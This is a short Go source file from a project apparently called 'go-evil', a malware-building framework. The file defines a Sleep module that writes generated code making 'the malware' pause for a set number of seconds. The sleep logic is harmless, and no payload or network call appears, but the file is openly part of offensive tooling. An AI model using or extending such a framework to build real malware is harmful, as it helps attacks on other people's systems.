package sleep

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
)

// Makes the malware sleep for an n amount of seconds
func Sleep(s_json string, value string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Sleep"

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{"repr_1 []int"},

		Gut: []string{
			"i_value := tools.String_to_int(spine.variable.get(spine.alpha.construct_string(repr_1)))",
			"time.Sleep(time.Duration(i_value) * time.Second)",
		}})

	data_object.Add_go_import("time")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")

	parameter_1 := data_object.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}, structure.Send(data_object)
}